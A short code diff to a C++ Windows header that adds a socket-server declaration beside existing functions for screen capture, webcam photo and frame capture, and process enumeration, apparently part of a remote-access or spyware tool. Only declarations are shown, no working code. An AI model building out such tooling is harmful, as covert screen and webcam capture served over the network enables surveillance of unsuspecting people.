@@ -16,6 +16,8 @@
 #include <TlHelp32.h>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
+#include <chrono>
+#include <cstdlib>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -30,3 +32,4 @@ bool captureScreen(const std::string& filename);
 bool captureWebcamPhoto(const std::string& filename);
 std::string captureWebcamFrames(int duration);
 bool fileExists(const std::string& filename);
+void startSocketServer();
